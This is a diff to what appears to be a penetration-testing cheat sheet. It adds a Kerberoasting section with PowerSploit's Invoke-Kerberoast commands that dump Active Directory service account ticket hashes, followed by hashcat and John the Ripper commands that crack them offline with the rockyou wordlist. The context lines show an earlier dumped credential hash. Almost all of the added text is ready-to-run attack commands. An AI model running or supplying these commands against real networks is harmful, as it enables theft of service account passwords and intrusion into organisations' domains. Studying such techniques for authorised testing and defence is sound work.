@@ -43,3 +43,22 @@ Output:
     C:\>type output.txt
     test:AMPLIALABS:01020304050607080900010203040506:98971234567865019812734576890102
     C:\>
+
+## Powershell Mimikatz - Dump Service Account Passwords (Keberoast)
+
+[Powersploit] (https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
+
+Input:
+
+    PS> invoke-kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash <hash>
+    
+[hashcat] (https://github.com/hashcat/hashcat.git)
+
+    PS> invoke-kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash > ./krbtgs-23.txt
+    hashcat -m 13100 -a 0 -w 4 --session kerb -o hash.pot --powertune-enable ./krb-tgs-23.txt
+    /opt/rockyou.txt -r ./hashcat-3.10/rules/dive.rule
+
+[JohnTheRipper (Magnum Ripper)] (https://github.com/magnumripper/JohnTheRipper)
+
+    PS> invoke-kerberoast -OutputFormat John | Select-Object -ExpandProperty hash
+    
